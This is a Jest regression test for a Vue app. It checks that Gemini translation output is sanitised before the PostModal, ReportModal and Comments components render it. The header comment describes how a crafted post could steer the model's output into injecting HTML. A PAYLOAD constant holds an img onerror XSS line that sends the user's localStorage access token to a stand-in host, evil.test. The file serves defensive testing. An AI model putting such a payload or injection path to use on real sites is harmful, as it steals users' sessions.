/**
 * The LLM translation path must not be able to inject HTML into the page.
 *
 * WHY: $cleanBody was applied to the text SENT to Gemini but not to what came BACK. The
 * result renders through <SafeRemarkable :options="{html:true}">, which despite its name
 * does NO sanitising - it wraps vue-remarkable, which assigns innerHTML. The prompt tells
 * the model to preserve HTML and wraps the post body in delimiters its author can close,
 * so a crafted post can steer the output. One click on "Translate" would run it on
 * actifit.io, where the session lives in localStorage.
 *
 * WHY THESE TESTS LOOK LIKE THIS: the first version of this file asserted on $cleanBody
 * and $safeUrl directly and never touched the components. Review proved it worthless by
 * reverting the production fix and watching all 18 tests still pass - it tested helpers
 * that already had their own coverage, not the call sites. These tests therefore drive
 * the REAL translateContent() with the real gemini-client mocked, and assert on the
 * component state that gets rendered. Revert any of the three fixes and this goes red.
 */
jest.mock('hive-auth-wrapper', () => ({ broadcast: jest.fn(), authenticate: jest.fn() }))

// The one seam: stand in for the network call, return attacker-controlled "translation".
const mockTranslate = jest.fn()
jest.mock('@/components/gemini-client.js', () => ({
  translateTextWithGemini: (...args) => mockTranslate(...args),
  __esModule: true,
}))

import Vue from 'vue'
import '@/plugins/vue-custom'
import PostModal from '@/components/PostModal.vue'
import ReportModal from '@/components/ReportModal.vue'
import Comments from '@/components/Comments.vue'

process.client = true

const PAYLOAD = `<img src=x onerror="fetch('https://evil.test/?t='+localStorage.access_token)">`

// Minimal vm per component: only what translateContent() touches.
const makeVm = (overrides = {}) => ({
  post: { body: 'orig', author: 'alice', permlink: 'p' },
  report: { body: 'orig', author: 'alice', permlink: 'p' },
  full_data: { body: 'orig', author: 'alice', permlink: 'p' },
  safety_post_content: 'orig',
  translatedText: '',
  displayBody: '',
  showTranslated: false,
  translationLoading: false,
  translationCache: {},
  $cleanBody: Vue.prototype.$cleanBody,
  $notify: jest.fn(),
  $t: (k) => k,
  // Comments.translateContent also calls these two. Without them it threw into its own
  // catch, left translatedText as '', and the XSS assertions passed VACUOUSLY on an empty
  // string - the exact failure mode the "benign translation still survives" case exists
  // to expose. Stubbed rather than omitted so the method runs to completion.
  commentBody: function () { return this.$cleanBody(this.full_data.body) },
  updateCache: jest.fn(),
  ...overrides,
})

const CASES = [
  ['PostModal', PostModal],
  ['ReportModal', ReportModal],
  ['Comments', Comments],
]

describe('translateContent sanitises the model output before it is rendered', () => {
  beforeEach(() => { mockTranslate.mockReset(); mockTranslate.mockResolvedValue(PAYLOAD) })

  it.each(CASES)('%s: an injected payload never reaches translatedText', async (_name, Comp) => {
    const vm = makeVm()

    await (Comp.options ? Comp.options.methods : Comp.methods).translateContent.call(vm)

    // The assertion that matters: what the template will render.
    expect(vm.translatedText).not.toMatch(/\son[a-z]+\s*=/i)
    expect(vm.translatedText).not.toContain('evil.test')
    expect(vm.translatedText).not.toMatch(/<script/i)
  })

  it.each(CASES)('%s: sends the RAW body to the model, not pre-rendered HTML', async (_name, Comp) => {
    // Double-running $cleanBody is not idempotent: it re-escapes & in image URLs
    // (&amp; -> &amp;amp;, giving a literal "amp;" in the src), drops alt text, and
    // emits a ghost empty anchor per @mention. Passing the raw body keeps it to one pass.
    const vm = makeVm()

    await (Comp.options ? Comp.options.methods : Comp.methods).translateContent.call(vm)

    expect(mockTranslate).toHaveBeenCalledTimes(1)
    expect(mockTranslate.mock.calls[0][0]).toBe('orig')
  })

  it.each(CASES)('%s: a benign translation still survives', async (_name, Comp) => {
    // Without this, a sanitiser that returned '' would satisfy every test above while
    // silently breaking the translate feature.
    mockTranslate.mockResolvedValue('Hello **world**')
    const vm = makeVm()

    await (Comp.options ? Comp.options.methods : Comp.methods).translateContent.call(vm)

    expect(vm.translatedText).toMatch(/Hello/)
    expect(vm.translatedText).toMatch(/world/)
  })
})

describe('one $cleanBody pass does not corrupt image URLs', () => {
  // Pins the regression the double pass caused, independently of the components.
  const clean = (s) => Vue.prototype.$cleanBody.call({}, s)

  it('does not double-escape an ampersand in an image query string', () => {
    const once = String(clean('![Sunset](https://usermedia.actifit.io/a/photo.jpg?v=2&size=large)'))
    expect(once).not.toContain('&amp;amp;')

    // Running it a second time - what the old code effectively did - is what broke it.
    const twice = String(clean(once))
    expect(twice).toContain('&amp;amp;')
  })
})
